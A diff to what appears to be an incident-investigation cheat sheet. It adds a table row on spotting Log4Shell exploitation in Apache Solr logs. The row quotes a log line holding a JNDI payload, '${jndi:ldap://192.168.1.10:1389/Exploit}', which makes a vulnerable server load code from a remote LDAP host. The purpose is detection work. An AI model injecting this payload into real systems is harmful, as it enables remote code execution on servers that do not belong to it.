@@ -1143,11 +1143,12 @@ For KQL queries on MSSQL, use
 event.provider : "MSSQL$SQLEXPRESS"
 ```
 
-#### log4shell
+#### log4shell/log4j
 In the event where sysmon log is gone.
 |**What To Look For**|**Where To Find It**|**Investigation Tool**|
 |:---:|:---:|:---:|
 |To see what attacker's IP address and URL was visited, especially `log4shell.huntress.com` payload as it can be used to detect vCenter instance is vulnerable|`C:\ProgramData\VMware\vCenterServer\runtime\VMwareSTSService\logs\websso.log`|Notepad|
+|HTTP GET by apache solr call, `HttpSolrCall [admin] webapp=null path=/admin/cores params={foo=${jndi:ldap://192.168.1.10:1389/Exploit}} status=0 QTime=0` where path is the exploited path, foo is the GET request parameter to deliver log4j payload|`log.file.path: /var/solr/logs/solr.log`|ELK|
 
 ---
 ---
